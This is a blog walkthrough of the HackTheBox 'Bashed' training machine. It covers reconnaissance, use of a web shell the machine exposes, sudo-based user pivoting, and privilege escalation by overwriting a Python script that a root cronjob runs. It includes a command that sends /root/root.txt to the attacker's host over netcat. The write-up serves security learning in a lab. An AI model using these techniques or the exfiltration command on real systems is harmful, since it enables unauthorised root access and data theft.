---
Title: HackTheBox Bashed
Date: 2018-02-27
Category: Challenges
Status: published
---

Bashed is a great entry-level box for people who are just getting started with HackTheBox. If you are just getting started with penetration testing, the value of this box is less in its technical content but rather in giving you the chance to exercise through your processes once. A bit like jumping into the water for the first time after doing dry-swimming. Let's jump in!

First we run a basic nmap scan to see what ports are running on the server:

```
Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-27 19:06 CET
Nmap scan report for 10.10.10.68
Host is up (0.027s latency).
Not shown: 999 closed ports
PORT STATE SERVICE
80/tcp open http

Nmap done: 1 IP address (1 host up) scanned in 1.01 seconds
```

Navigating to port 80, this is our first sight:

![Image]({static}/images/882342764.png){: .image-process-article-image}

The blog seems to belong to the developer of a PHP reverse shell. They also mention that it was developed on this very server. Foreshadowing. Thinking about likely directories, we try out `upload `- nope; `uploads `- nope; `dev `- bingo.

![Image]({static}/images/503885520-1.png){: .image-process-article-image}

Going to the minified shell file, we are greeted with an interactive prompt as the `bashed` user. The nice developer saved us the work of constructing and uploading a payload ourselves.

![Image]({static}/images/927448957.png){: .image-process-article-image}

This is not enough to give us the user flag, however. A quick check through `sudo -l` exposes a trivial privilege escalation vector. We can upgrade to the `scriptmanager` user right away:

```
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

This gives us access to the user flag under `/home/scriptmanager/flag.txt`. Browsing the filesystem with our new
privileges now gives us access to the `/scripts` directory:

```sh
sudo -u scriptmanager
ls -alh /scripts

total 16K
drwxrwxr-- 2 scriptmanager scriptmanager 4.0K Dec 4 18:06 .
drwxr-xr-x 23 root root 4.0K Dec 4 13:02 ..
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec 4 17:03 test.py
-rw-r--r-- 1 root root 12 Feb 27 10:16 test.txt
```

The test.py file contains the following code:

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

The test file is owned by the root user. This, along with the regularly refreshing modification date, hints at the
presence of some cronjob executing the Python script with root privileges. As we have write-level access to the Python
file, we can escalate our privileges very easily by overwriting its contents with our own payload.

```
sudo -u scriptmanager sh -c "echo "import os;os.system('cat /root/root.txt | nc 10.10.14.210 4444')" > /scripts/test.py"
```

`os.system` simply takes a string with a shell command here and executes it as the current user. With netcat conveniently being present on the system, we simply transmit the root flag to our machine. After a short wait time, we receive the payload on our listener:

![Image]({static}/images/2114701126.png){: .image-process-article-image}
